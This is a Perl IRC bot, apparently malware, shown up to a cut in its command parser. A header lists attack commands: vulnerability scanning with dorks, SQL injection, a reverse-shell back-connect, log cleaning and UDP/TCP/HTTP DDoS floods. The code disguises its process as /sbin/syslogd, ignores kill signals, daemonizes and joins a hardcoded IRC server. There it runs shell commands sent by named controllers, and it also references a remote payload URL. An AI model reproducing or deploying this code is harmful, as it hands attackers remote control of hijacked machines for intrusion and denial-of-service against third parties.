#!/usr/bin/perl
####################################
# Original Design By Pitbul Modded By auRy
#-[auRy B0T Commands List]-
#-----[Hacking Based]-----
# !evo @multiscan <vuln> <dork>
# !evo @socks5
# !evo @sql2 <vuln> <dork> <col>
# !evo @portscan <ip>
# !evo @logcleaner
# !evo @sendmail <subject> <sender> <recipient> <message>
# !evo @system
# !evo @cleartmp
# !evo @rootable
# !evo @nmap <ip> <beginport> <endport>
# !evo @back <ip><port>  
# !evo @linuxhelp
# !evo @cd tmp:. | for example
#-----[Advisory-New Based]-----
# !evo @packetstorm
# !evo @milw0rm
#-----[DDos Based]-----
# !evo @udpflood <host> <packet size> <time>
# !evo @tcpflood <host> <port> <packet size> <time>
# !evo @httpflood <host> <time>
# !evo @sqlflood <host> <time>
#-----[IRC Based]-----
# !evo @killme  
# !evo @join #channel
# !evo @part #channel
# !evo @reset
# !evo @voice <who>
# !evo @owner <who>
# !evo @deowner <who>
# !evo @devoice <who>
# !evo @halfop <who>
# !evo @dehalfop <who>
# !evo @op <who>
# !evo @deop <who>
#-----[Flooding Based]-----
# !evo @msgflood <who>
# !evo @dccflood <who>
# !evo @ctcpflood <who>
# !evo @noticeflood <who>
# !evo @channelflood
# !evo @maxiflood <who>
####################################
use HTTP::Request;
use LWP::UserAgent;
my $processo = '/sbin/syslogd';
my $linas_max='10';
my $sleep='5';
my $cmd="http://h4ck3d.wsnw.net/mic22.txt";
my $id="http://h4ck3d.wsnw.net/mic22.txt";
############################################
my @adms=("DoRaMi","HaFuRuKi");
my @canais=("#NaBy");
#Put your channel here
my @nickname = ("Abdulrazak","Ackerman","Adams","Addison","Adelstein","Adibe","Adorno","Ahlers","Alavi","Alcorn","Alda","Aleks","Allison","Alongi","Altavilla","Altenberger","Altenhofen","Amaral","Amatangelo","Ameer","Amsden","Anand","Andel",
	"Ando","Andrelus","Andron","Anfinrud","Ansley","Anthony","Antos","Arbia","Arduini","Arellano","Aristotle","Arjas","Arky","Atkins","Augustus","Aurelius","Axelrod","Axworthy","Ayiemba","Aykroyd","Ayling","Azima","Bachmuth","Backus","Bady","Baglivo","Bagnold",
	"Bailar","Bakanowsky","Baleja","Ballatori","Ballew","Baltz","Banta","Barabesi","Barajas","Baranczak","Baranowska","Barberi","Barbetti","Barneson","Barnett","Barriola","Barry","Bartholomew","Bartolome","Bartoo","Basavappa","Bashevis","Batchelder","Baumiller","Bayles","Bayo",
	"Beacon","Beal","Bean","Beckman","Beder","Bedford","Behenna","Belanger","Belaoussof","Belfer","Belin-Collart","Bellavance","Bellhouse","Bellini","Belloc","Benedict-Dye","Bergson","Berke-Jenkins","Bernardo","Bernassola","Bernston","Berrizbeitia","Betti","Beynart","Biagioli",
	"Bickel","Binion","Bir","Bisema","Bisho","Blackbourn","Blackwell","Blagg","Blakemore","Blanke","Bliss","Blizard","Bloch","Bloembergen","Bloemhof","Bloxham","Blyth","Bolger","Bolick","Bollinger","Bologna","Boner","Bonham","Boniface","Bontempo","Book","Bookbinder","Boone",
	"Boorstin","Borack","Borden","Bossi","Bothman","Botosh","Boudin","Boudrot","Bourneuf","Bowers","Boxer","Boyajian","Boyes","Boyland","Boym","Boyne","Bracalente","Bradac","Bradach","Brecht","Breed","Brenan","Brennan","Brewer","Brewer","Bridgeman","Bridges","Brinton",
	"Britz","Broca","Brook","Brzycki","Buchan","Budding","Bullard","Bunton","Burden","Burdzy","Burke","Burridge","Busetta","Byatt","Byerly","Byrd","Cage","Calnan","Cammelli","Cammilleri","Canley","Capanni","Caperton","Capocaccia","Capodilupo","Cappuccio","Capursi","Caratozzolo",
	"Carayannopoulos","Carlin","Carlos","Carlyle","Carmichael","Caroti","Carper","Cartmill","Cascio","Case","Caspar","Castelda","Cavanagh","Cavell","Ceniceros","Cerioli","Chapman","Charles","Cheang","Cherry","Chervinsky","Chiassino","Chien","Childress","Childs","Chinipardaz",
	"Chinman","Christenson","Christian","Christiano","Christie","Christopher","Chu","Chupasko","Church","Ciampaglia","Cicero","Cifarelli","Claffey","Clancy","Clark","Clement","Clifton","Clow","Coblenz","Coito","Coldren","Colella","Collard","Collis","Compton","Compton",
	"Comstock","Concino","Condodina","Connors","Corey","Cornish","Cosmides","Counter","Coutaux","Crawford","Crocker","Croshaw","Croxen","Croxton","Cui","Currier","Cutler","Cvek","Cyders","daSilva","Daldalian","Daly","D'Ambra","Danieli","Dante","Dapice","D'arcangelo","Das",
	"Dasgupta","Daskalu","David","Dawkins","DeGennaro","DeLaPena","del'Enclos","deRousse","Debroff","Dees","Defeciani","Delattre","Deleon-Rendon","Delger","Dell'acqua","Deming","Dempster","Demusz","Denault","Denham","Denison","Desombre","Deutsch","D'fini","Dicks","Diefenbach","Difabio",
	"Difronzo","Dilworth","Dionysius","Dirksen","Dockery","Doherty","Donahue","Donner","Doonan","Dore","Dorf","Dosi","Doty","Doug","Dowsland","Drinker","D'souza","Duffin","Durrett","Dussault","Dwyer","Eardley","Ebeling","Eckel","Edley","Edner","Edward","Eickenhorst","Eliasson",
	"Elmendorf","Elmerick","Elvis","Encinas","Enyeart","Eppling","Erbach","Erdman","Erdos","Erez","Espinoza","Estes","Etter","Euripides","Everett","Fabbris","Fagan","Faioes","Falco-Acosta","Falorsi","Faris","Farone","Farren","Fasso'","Fates","Feigenbaum","Fejzo","Feldman",
	"Fernald","Fernandes","Ferrante","Ferriell","Feuer","Fido","Field","Fink","Finkelstein","Finnegan","Fiorina","Fisk","Fitzmaurice","Flier","Flores","Folks","Forester","Fortes","Fortier","Fossey","Fossi","Francisco","Franklin-Kenea","Franz","Frazier-Davis","Freid","Freundlich",
	"Fried","Friedland","Frisken","Frowiss","Fryberger","Frye","Fujii-Abe","Fuller","Furth","Fusaro","Gabrielli","Gaggiotti","Galeotti","Galwey","Gambini","Garfield","Garman","Garonna","Geller","Gemberling","Georgi","Gerrett","Ghorai","Gibbens","Gibson","Gilbert","Gili","Gill","Gillispie",
	"Gist","Gleason","Glegg","Glendon","Goldfarb","Goncalves","Good","Goodearl","Goody","Gozzi","Gravell","Greenberg","Greenfeld","Griffiths","Grigoletto","Grummell","Gruner","Gruppe","Guenthart","Gunn","Guo","Ha","Haar","Hackman","Hackshaw","Haley","Halkias","Hallowell","Halpert",
	"Hambarzumjan","Hamer","Hammerness","Hand","Hanssen","Harding","Hargraves","Harlow","Harrigan","Hartman","Hartmann","Hartnett","Harwell","Haviaras","Hawkes","Hayes","Haynes","Hazlewood","Heermans","Heft","Heiland","Hellman","Hellmiss","Helprin","Hemphill","Henery","Henrichs",
	"Hernandez","Herrera","Hester","Heubert","Heyeck","Himmelfarb","Hind","Hirst","Hitchcock","Hoang","Hock","Hoffer","Hoffman","Hokanson","Hokoda","Holmes","Holoien","Holter","Holway","Holzman","Hooker","Hopkins","Horsley","Hoshida","Hostage","Hottle","Howard","Hoy","Huey","Huidekoper",
	"Hungerford","Huntington","Hupp","Hurtubise","Hutchings","Hyde","Iaquinta","Ichikawa","Igarashi","Inamura","Inniss","Isaac","Isaievych","Isbill","Isserman","Iyer","Jacenko","Jackson","Jagers","Jagger","Jagoe","Jain","Jamil","Janjigian","Jarnagin","Jarrell","Jay","Jeffers","Jellis",
	"Jenkins","Jespersen","Jewett","Johannesson","Johannsen","Johns","Jolly","Jorgensen","Jucks","Juliano","Julious","Kabbash","Kaboolian","Kafadar","Kalbfleisch","Kaligian","Kalil","Kalinowski","Kalman","Kamel","Kangis","Karpouzes","Kassower","Kasten","Kawachi","Kee","Keenan","Keepper",
	"Keith","Kelker","Kelsey","Kempton","Kemsley","Kendall","Kerry","Keul","Khong","Kimmel","Kimmett","Kimura","Kindall","Kinsley","Kippenberger","Kirscht","Kittridge","Kleckner","Kleiman","Kleinfelder","Klemperer","Kling","Klinkenborg","Klint","Knuff","Kobrick","Koch","Kohn","Koivumaki",
	"Kommer","Koniaris","Konrad","Kool","Korzybski","Kotter","Kovaks","Kraemer","Krailo","Krasney","Kraus","Kroemer","Krysiak","Kuenzli","Kumar","Kusman","Kuwabara","La","Labunka","Lafler","Laing","Lallemant","Landes","Lankes","Lantieri","Lanzit","Laserna","Lashley","Lawless","Lecar",
	"Lecce","Leclercq","Leite","Lenard","Sofia","Lesser","Lessi","Liakos","Lidano","Liem","Light","Lightfoot","Lim","Linares","Linda","Linder","Line","Linehan","Linzee","Lippmann","Lipponen","Little","Litvak","Livernash","Livi","Livolsi","Lizardo","Locatelli","Longworth","Loss","Loveman",
	"Lowenstein","Loza","Lubin","Lucas","Luciano","Luczkow","Luecke","Lunetta","Luoma","Lussier","Lutcavage","Luzader","Ma","Maccormac","Macdonald","Maceachern","Macintyre","Mackenney","MacMillan","Macy","Madigan","Maggio","Mahony","Maier","Maine-Hershey","Maisano","Malatesta","Maller",
	"Malova","Manalis","Mandel","Manganiello","Mantovan","March","Marchbanks","Marcus","Margalit","Margetts","Marques","Martinez","Martochio","Marton","Marubini","Mass","Matalka","Matarazzo","Matsukata","Mattson","Mauzy","May","Mazzali","Mazziotta","Mcbride","Mccaffery","Mccall",
	"Mcclearn","Mcdowell","Mcelroy","McFadden","Mcghee","Mcgoldrick","McIlroy","Mcintosh","Mcdonald","Mclane","Mclaren","Mcnealy","Mcnulty","Meccariello","Memisoglu","Menzies","Merikoski","Merlani","Merminod","Merseth","Merz","Metelka","Metropolis","Meurer","Michelman","Middle",
	"Mieher","Mills","Minh","Mini","Minichiello","Gonzalez","Mitropoulos","Mittal","Mocroft","Modestino","Moeller","Mohr","Moiamedi","Monque","Montilio","MooreDeCh.","Morani","Moreton","Morrison","Morrow","Mortimer","Mosher","Mosler","Mostafavi","Motooka","Mudarri","Muello","Mugnai","Mulkern",
	"Mulroy","Mumford","Mussachio","Naddeo","Napolitano","Nardi","Nardone","Naviaux","Nayduch","Nelson","Nenna","Nesci","Neuman","Newfeld","Newlin","Ng","Ni","Nickerson","Nickoloff","Nisenson","Nitabach","Notman","Nuzum","Ocougne","Ogata","Oh","O'hagan","Oldford","Olsen","Olson","Olszewski",
	"O'malley","Oman","O'meara","Opel","Oray","Orfield","Orsi","Ospina","Ostrowski","Ottaviani","Otten","Ouchida","Ovid","PaesDealmeida","Paine","Palayoor","Palepu","Pallara","Palmitesta","Panadero","Panizzon","Pantilla","Paoletti","Parmeggiani","Parris","Partridge","Pascucci","Patefield",
	"Patrick","Pattullo","Pavetti","Pavlon","Pawloski","Paynter","Peabody","Pearlberg","Pederson","Peishel","Penny","Pereira","Perko","Perlak","Perlman","Perna","Perone","Perrimon","Peters","Petruzello","Pettibone","Pettit","Pfister","Pilbeam","Pinot","Plancon","Plant","Plasket","Plous",
	"Po","Pocobene","Poincaire","Pointer","Poirier","Polak","Polanyi","Politis","Poma","Poolman","Powers","Presper","Preucel","Prevost","Pritchard","Pritz","Proietti","Prothrow-Stith","Puccia","Pugh","Pynchon","Quaday","Quetin","Rabe","Rabkin","Radeke","Rajagopalan","Raney","Rangan","Rankin",
	"Rapple","Rayport","Redden-Tyler","Reedquist","Cunningham","Reinold","Remak","Renick","Repetto","Resnik","Rhea","Richmond","Rielly","Rindos","Rineer","Rish","Rivera","Robinson","Rocha","Roesler","Rogers","Ronen","Row","Royal","Ru","Ruan","Ruderman","Ruescher","Rush","Ryu","Sabatello",
	"Sadler","Safire","Sahu","Sali","Samson","Sanchez-Ramirez","Sanna","Sapers","Sarin","Sartore","Sase","Satin","Satta","Satterthwaite","Sawtell","Sayied","Scarponi","Scepan","Scharf","Scharlemann","Scheiner","Schiano","Schifini","Schilling","Schmitt","Schossberger","Schuman","Schutte",
	"Schuyler","Schwan","Schwickrath","Scovel","Scudder","Seaton","Seeber","Segal","Sekler","Selvage","Sen","Sennett","Seterdahl","Sexton","Seyfert","Shaikh","Shakis","Shankland","Shanley","Shar","Shatrov","Shavelson","Shea","Sheats","Shepherd","Sheppard","Shepstone","Shesko","Shia",
	"Shibata","Shimon","Siesto","Sigalot","Sigini","Signa","Silverman","Silvetti","Sinsabaugh","Sirilli","Sites","Skane","Skerry","Skoda","Sloan","Slowe","Smilow","Sniffen","Snodgrass","Socolow","Solon","Somers","Sommariva","Sorabella","Sorg","Sottak","Soukup","Soule","Soultanian","Spanier",
	"Sparrow","Spaulding","Speizer","Spence","Sperber","Spicer","Spiegelhalter","Spiliotis","Spinrad","StMartin","Stalvey","Stam","Stang","Stassinopolus","States","Statlender","Stefani","Steiner","Stephanian","Stepniewska","Stewart-Oaten","Stiepock","Stillwell","Stock","Stockton","Stockwell","Stolzenberg",
	"Stonich","Storer","Stott","Strange","Strauch","Streiff","Stringer","Sullivan","Sumner","Suo","Surdam","Sweeting","Sweetser","Swindle","Tagiuri","Tai","Talaugon","Tambiah","Tandler","Tanowitz","Tatar","Taveras","Tawn","Tcherepnin","Teague","Temes","Temmer","Tenney","Terracini","Than",
	"Thavaneswaran","Theodos","Thibault","Thisted","Thomsen","Throop","Tierney","Till","Timmons","Tofallis","Tollestrup","Tolls","Tolman","Tomford","Toomer","Topulos","Torresi","Torske","Towler","Toye","Traebert","Trenga","Trewin","Tringali","Troiani","Troy","Truss","Tsiatis","Tsomides","Tsukurov",
	"Tuck","Tudge","Tukan","Turano","Turek","Tuttle","Twells","Tzamarias","Ullman","Untermeyer","Upsdell","Urban","Urdang-Brown","Usdan","Uzuner","Vacca","Waite","Valberg","Valencia","Wales","Wallenberg","Walter","vanAllen","VanZwet","Vandenberg","Vanheeckeren","Warshafsky","Wasowska","Vasquez",
	"Waugh","Weighart","Weingarten","Weinhaus","Weissbourd","Weissman","Velasquez","Welles","Welsh","Wengret","Venne","Verghese","Wescott","Wetzel","Whately","Whilton","White","Whitla","Whittaker","Viana","Viano","Wiedersheim","Wiener","Viens","Vignola","Wilder","Wilhelm","Wilk","Wilkin","Wilkinson",
	"Villarreal","Willstatter","Wilson","Vitali","Viviani","Voigt","Wolk","VonHoffman","Woo","Wooden","Woods","Woods-Powell","Vorhaus","Votey","Yacono","Yamane","Yankee","Yarchuk","Yates","Ybarra","Yedidia","Yesson","Yetiv","Yoffe","Yoo","Youk-See","Yu","Zachary","Zahedi","Zangwill","Zegans","Zerbini",
	"Zoldak","Zucconi","Zurn","Zwiers","MX_CREW","PT_GELAP_GULITA","PT_REDUP","CV_MAKNYUSS","PO_maju-mundur","Warung_kopi","Kota_palembang","PLG-vs-SITUBONDO","jerawatan","jupe","keset","kuburan_band","dream_theater","dj^slipknot","a7X-","co_korn","MX_Community","ce_garung","ce_20fs","ce_tak_mampu","kerox_dah","ce_suk4_kamu","co_sepi_deh","bertato","gj^konde","MX|off","dj^konde","Plaju_fm","kasidahhhh","wonk_pelit","ce_ngantukKkk","38b","bahhhh","palembang-undercover",
	"MX_TEAM","Jupiter^36","Sikat_pak","KaIpin","FaskaIis","tak_gendong","mbah_surip","Ddos-ah","LInux_kabeh","co_kocak","ndL-guanteng","dj^tekor","sum412","metalikaaa","jirok","jambrud","gak_mau_jadi_locop","co_locop","modyaaarrr","ojomaneh","sakkarepmu","ce_kabeh_rekk","co_ngacenggg","PT.remang2","co_buta","co_cari_yg_bulet2","cew_diskoan","ceprooott","pisang_ambon","Mbah_g00gle","yahooooo","webng_elek",
	"engkok","bekna","arapa","MXirc-kupluk","dj^cli","co_master_plood","plooder_kunyit","ap_pole","kusutdah","krasakrusuk","mainsawah","korek_gas","jeduummm","makbyurrrr","ce_masdut","kongkalikong","co_dakian","mantaf_rek","sepet","pait","asemmmm","cew_cari_banci","duda_cari_janda","sikat_kabeh","bronjol","kudis_co","Pantat_co","sprite_co",
	"ayamm","cocacola_co","pa9e","bak0eng","pacen9","skln","^R_i_R_i_N^","jinraZ","cool^bO0y",	"poseldon^104","vaynrd","k-lined","ce_diguahantu","sibuta_dan_situli","jambred","suster_ngacir","ken_dedesss","semerbak_kentut","kutaklakulaku","co_miskin_pemimpi","co_banyak_dueeet","taktiktuktektok","beletengambune","gredes","co_co_co","sangkedun","tukiman","paijem","roebino","limbad","dunkanin","ce_suka_pegang","Jupiter^127","Jupiter^128","Jupiter^129",
	"Jupiter^130","Jupiter^131","Jupiter^132","Jupiter^133","Jupiter^134","Telkom","Ely","Zue_gilrs","koceng","moseng","Sandi_laseng","Telagah","blutot","Beringsang","sony_erictions","Hp","sup","Gunung","bangau","robot","Pengawal","jubek","Tukiyem","Sumarna",	"Sarminto","Marjito","bajingan","Siemen","Langai","Murnie", "Wahed", "Tolak", "Aga_jelek",
	"Sandy_bau", "Hendrik_bau", "hendra_laseng", "Poinem_stres", "Tukiem_kebelet", "Tukimin_kasmaran", "Kambing_pak_RT", "Jatuh_cinta", "Cinta_abadi", "apa_itu_cinta", "Capek_dech", "Ampyun_DC","MX_Keren", "MX_Cakep", "mxIRC_MyChan", "Cewek^gateL", "Cowok^pengeN", "Falen_Blagu", "Tiara_Oyes", "Mami_papi", "Papi_sayang_mami", "Sungguh_terlalu", "Metal_rocker", "Metal_Palembang", "ndL_doyan_kambing", "Males_Chating",
        "Jgn_ganggu_gue", "Pv_gue_dunk", "Ali_gili", "Raka_maniak", "Orang_baek", "Putri^misterI", "Ngantukkk", "Pussiing", "Bok3kk", "Roman-Milan", "nak_networkk", "Falens", "Priangs","Libraboyss", "Triple_X", "TarzanXX", "Sapr0l","L0uhann", "Sakmad","Aijjin", "moncossZ", "KAD3k", "S0bluckk", "Goess", "Nie^Cutes", "Najj^mee", "Co_asmarA", 
        "Co^76", "Co^MX", "Master_Xpresi", "Susilo_BY", "Jusuf_Kalah", "Mega_Pro", "Ice_Trisnawati", "Rita_Sugiarto", "Reni^Farida", "Dian_Fahira", "Putri_titian", "RhomaIrama","RidhoRhoma", "KangenBand", "D`nasibb", "Iis_Dahlia", "The-Master", "J0e^jelek", "Slankersz", "Mbah_Suripp", "Tak_gendong", "Please_wait", "Now_Loading", "New_Folder", 
        "TurtleBay", "Black_Edition", "Special_Edition", "Sodiqq", "David-Beckham", "C-Ronaldo", "Injector_maniak", "Tape_Goreng", "Nyamuk_Ikzs","Anuku_Bengkak", "To0o0o0o0L0o0o0ng", "mxIRC_VF", "mxIRC_BE", "mxIRC_SE", "Lavendaa", "Wafer_chocolatos", "Mamamia_Lezatoz", "Gue_Ganteng_Kan",
        "emmak_gue_mana","Oyesss_oohhh_Nooo","gembel_ellite","dj_doing","kelambu","pak_kudis","raja_coli","kelemer","selemetik","semelekete","Godain_gue_donk","Buruan_pv_gue","Error-Man","Error-girl","Awassssss","Assalamuala1kum","Permisi_mas","Cewek_injecT","Cewek^17thn","DinNitami","Asjas_marah","nick_keren", "cokelatoz", "Jefri_un", "ceWek`gatel", "sella_mat", "Dora-kecil", "si_manja", "nick_apa", "bang_ma^un", "no^nick",
        "aku_bot", "si_ganjen", "conan^edogawa", "si_mentel", "ce`Manja", "Mr.Jefry", "Jupe_gitchu", "[K]Desa", "^Kagome", "Kimi_No_Yume", "Utada_hikaru","didi_petet","asal_nick","dh4ni", "pv_yuk", "mai_kuraki", "King-Arthas", "Conan", "dora_sedih", "Nec-Nec", "King_bot", "con[a]n`xs", "A-Riise", "Lampard",
        "ZumiZola", "Contiex`s", "Bot_ol", "[A]ntI", "Airins", "rokr_E1", "x-x-x", "Nia_imudh", "jojojo", "nanana", "Si_peot", "E-rix", "kikiki", "shepthy","Sry`nTeall", "mimin", "Devils-Allnetwork", "Mr-V", "jojon", "Die[a]ch", "Phia`e", "pipipi", "ce^cancer", "hahaha", "kokoko", "Jaros^Jr", "spyrozone",
        "Me2T", "Bud2", "maman", "E-Cho^e", "O2-c", "bot_cakep", "R-elf", "bot_ganteng", "V``Th[a]", "Mr_Superman", "Mrs_Dora", "juliez", "juliezmar_zahra", "Gheomancer","Mr_Solar", "hahihuheho", "mumun", "Mrs_Olief", "Yugo_Beppu", "Nia_caem", "cie_bebek", "cecep`s", "bang_rhoma", "TinaToon", "kop[r]al", "Sima`S", 
        "mengapa_aku_ganteng", "sagitariuz_boyz", "gak_pernah_mandi", "chilis", "mengapa_jadi_bot", "Empathy", "musaddad", "si_narsizz", "hadeuh", "mariana", "melarat", "devils-crew", 
        "YbOT", "bot_kejam", "Franciss", "ChairilAnwar", "Cew_Lutthcu", "Selnare", "dudutz_niech", "venny", "H4n4","SnoOp",
        "korupt[oooo]r", "hasan_bin_ma^un", "lelah_jadi_bot", "Miss_zahra", "kindaici", "pak-sby", "[J]agung", "[C]hiluc", "aissyah","BadBoy","BotEdan","Ampun-Dc","SiUsil",
        "nedved","jefrot","kael","kurcaci_jangkung","maiev_shadowsong","nenek_peot","kakek_peot","opa_peot","oma_peot","si_manyun","Kiroro","si_dudullz","Hero`s",
        "Rooster","Panglima","Restore","Ralph","Robert","Superman","Batman","Robin","Telemedia","Sanyo","Sanken","Ken","Ryu","Blanka",
        "Guile","ChunLie","Dorayaki","Sizuka","NoOne","NoBody","NoCheat","Nostradamus","Nockturno","Spooky","SinBad","Raul","RyuZaki",
        "Robby","Richard","Ronaldo","Ronaldinho","SonGoKu","TenShinHan","Kuririn","Pikkorro","SonGoTen","Trunks","Bezzitta","JinKuraKura",
        "ChiChi","Burma","Yamucha","Shell","Bhuu","Bezitz","SonGoHan","BolaNaga","BolaDunia","Captain","Crontab","Config","CGI","PCI","Express",
        "Installing","Configuration","Repair","BlackRX","RXRobo","RXBio","Ultraman","Ultramilk","KeyPad","KeyLock","Disket","Siescha",
        "Chick","Chuck","Check","Chock","Chack","Chacky","Friday","Sunday","Monday","Tuesday","Saturday","Thursday","Wednsday","March",
        "August","September","October","November","December","January","February","April","May","June","July","Founder","Keeper","Spammer",
        "Flooder","DhieKa","DhieCha","DhieDie","DhieNi","DhieTa","DhiSka","Dragon","Wolf","Ryans","Eddy","Edd","God","Ope","Offside","Inside","Outside",
        "DhieRa","DhieKi","DhieNa","DhieTan","DhieAn","DhieSep","DhieDonk","DhieNie","DhieCap","RaKaN","Unila","Darmajaya","UBL","UTB","Malahayati",
        "Griya","Teknokrat","Mantra","Umitra","Mitra","MoKa","Artomoro","Alfa","Saburai","UnSab","Kroto","Bandar","Narkoba","Togel","Kisno","DaniPedrossa",
        "ValentinoRossy","ChristVermeulen","NickyHayden","JohnHopkins","LorisCapirossi","Lorenzo","Cappuccino","CafeKito","TelukBetung",
        "Kemiling","Sukarame","TanjungKarang","BandarLampung","KotaBumi","PringSewu","SukaBumi","SukaRaja","Panjang","Pemandangan","Meteor",
        "Swiss","SpaceLounge","SpaceAlone","LounDigital","SUryadarma","SMK2Mei","SMKNUnila","YPUnila","SuryaDharma","STMBhinneka","SMKSN",
        "SMKN1","SMKN2","SMKN3","SMKN4","SMKN5","SMKN6","SMKN7","SMKN8","SMKN9","SMKN10","SMKN11","SMKN12","SMKN13","SMKN14","SMKN15","SMKN16","SMKN17",
        "Korpri","KarangAnyar","Natar","Metro","Probolinggo","LampungBarat","LampungSelatan","LampungTengah","Wates","BandarJaya","TalangPadang",
        "Tanggamus","VivaVilla","ChanTiks","Mellow","Romantic","mrBOY","mrCOOL","mrSad","mrFighter","Attacker","Finisher","FlawlessVictory",
        "Fantassy","MusicPost","HackedBY","Defacer","Cracker","Phreaker","Chatters","Users","GuestStar","Guester","Guest","Guest7610","GuestN73",
        "SonyEricson","Motorolla","Nokia","PlayMate","SoulMate","Dreamer","Worker","Willy","Antic","Artic","Ambalat","anggoro","anggia","angguk","Geleng",
        "Giling","Gulung","Galang","Golong","CoolBaby","NiceBaby","SweetBaby","Childist","Childer","Charming","Charmed","Beauty","Beast","Juliett","Romeo",
        "Tiwana","Grill","DarkCyber","DrunkenMaster","Drunken","Player","Eater","Beater","BeatMe","LyllFonda","AsiaCarrerra","Miyabi","MariaOzawa",
        "Horrible","Kingdom","Computer","Computindo","ElexMedia","FoxPro","VisualBasic","VisualC","Office","OfficeWord","OfficeExcel","OfficeAccess",
        "WindowsXP","WindowsVista","Windows2000","Windows98","WindowsMedia","Winamp","Winzip","Allzip","Alleggro","Prince","Yamaha","FunnyCats",
        "KuraKuraNinja","Andie","Lucass","RandyDePuniet","DoniTata","Donita","Daniel","Daniella","CaseyStonner","MaxBiaggi","Speeder","Walker","Runner",
        "Carrier","Protos","Zerg","Terran","ProtosCanon","ProtosDarkTerror","ProtosSpyShip","ZergDragon","TerranBarrack","TerranTank","TerranMissille",
        "TerranBunker","TerranRadar","TerranMarine","TerranNucklear","NucklearDetector","SpaceShips","Trooper","ProtosPsy","TerranAssimilator",
        "TerranUpgrade","ProtosUpgrade","ProtosBOT","Protosfer","ProtosEngine","BuildMoreSupply","ShowMeTheMoney","BlackSheepWall","WarCraft",
        "AlienShooter","Asimilator","Bunker","Kurt","Davids","Kyle","Roys","Hanks","Tom","Tommy","Angela","Lynda","HotButts","HardHolly","Rocks","Spirits",
        "PreCompile","Compiler","Completed","Exceeded","AgeOfEmpire","MotoGP","LapsToGo","Building","TownCenter","LevelOP","Aksess","DocumentRoot",
        "MakeFile","CD","Mkdir","Copyleft","Copy","Delete","Rm-Rf","Tar-zxvf","Rusak","Fools","Abuser","Ash","Cathrine","Willson","WillSmith","WouldUMarry",
        "MarryJane","AshleyCock","NetBean","JavaEmulator","JavaLanguage","Javanesse","Human","AOP","SOP","HOP","FO","Charger","Top","Down","Back","Next","Repeat",
        "Start","Stop","Before","After","Stars","Simpsons","AshleyCole","Coleman","Daddy","Mommy","Mom","Dad","Uncle","Aunt","Daughter","Brother","Sister",
        "GrandMa","GrandPa","CJ","aJ","aSL","aNt","Oktaria","Ramadhan","IdulFitri","IdulAdha","IdulQurban","Grinch","Spanish","Russian","Turks","Sparks",
        "Zylot","Zygot","Kiddie","Childie","Oldie","YounG","SmarT","IndoFood","IndoZone","IndoHack","IndoSpamm","IndoFlood","IndoCyber","IndoCount",
        "Smoker","Masking","MaskedRider","Rider","Ryacudu","Stabilizer","Printer","BackYard","FrontFace","Network","School","Colegge","Professor",
        "NaughtyAmerica","MySisterHotFriends","MyFriendHotMoms","MyHotFriends","Little","Bitt","FrontPage","Fool","Kareena","Girls","Ninna",
        "Nanda","Nindy","RUddy","Stuward","FrodoBaggins","Pherry","Fery","Fendor","PublicManager","Connections","Received","Sending","Sent","Receive",
        "Pending","Virgil","Shark","Sharpen","Addobe","Reader","CapekDech","UdahAch","IsengDikit","TestingBoss","Spada","AnyBody","Rida","Sita","Udahan");
my $nick = $nickname[rand scalar @nickname];
#Nickname of bot 
my $ircname ='Fxz';
chop (my $realname = '-=X*Net Project=-');
#IRC name and Realname 
$servidor='irc.byroe.net' unless $servidor;
my $porta='6667'; 
############################################
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir("/");

#Connect
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Masalah fork: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
sub sendraw {
   if ($#_ == '1') {
      my $socket = $_[0];
      print $socket "$_[1]\n";

   } else {
      print $IRC_cur_socket "$_[0]\n";
   }
}

sub conectar {
   my $meunick = $_[0];
   my $servidor_con = $_[1];
   my $porta_con = $_[2];

   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con",
   PeerPort=>$porta_con) or return(1);
   if (defined($IRC_socket)) {
      $IRC_cur_socket = $IRC_socket;
      $IRC_socket->autoflush(1);
      $sel_cliente->add($IRC_socket);
      $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
      $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
      $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
      $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
      nick("$meunick");
      sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
      sleep 1;
   }
}

my $line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
   select(undef, undef, undef, 0.01); #sleeping for a fraction of a second keeps the script from running to 100 cpu usage ^_^
   delete($irc_servers{''}) if (defined($irc_servers{''}));
   my @ready = $sel_cliente->can_read(0);
   next unless(@ready);
   foreach $fh (@ready) {
      $IRC_cur_socket = $fh;
      $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
      $nread = sysread($fh, $msg, 4096);
      if ($nread == 0) {
         $sel_cliente->remove($fh);
         $fh->close;
         delete($irc_servers{$fh});
      }
      @lines = split (/\n/, $msg);
      for(my $c=0; $c<= $#lines; $c++) {
         $line = $lines[$c];
         $line=$line_temp.$line if ($line_temp);
         $line_temp='';
         $line =~ s/\r$//;
         unless ($c == $#lines) {
            parse("$line");
         } else {
            if ($#lines == 0) {
               parse("$line");
            } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");
            } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse("$line"); 
            } else {
               $line_temp = $line;
            }
         }
      }
   }
}

sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING \:(.*)/) {
      sendraw("PONG :$1");
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
      my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
      if ($args =~ /^\001VERSION\001$/) {
         notice("$pn", "\001VERSION mIRC v6.17 auRy\001");
      }
      if (grep {$_ =~ /^\Q$pn\E$/i } @adms ) {
         if ($onde eq "$meunick"){
            shell("$pn", "$args");
         }
#End of Connect
         if ($args =~ /^(\Q$meunick\E|\!evo)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {
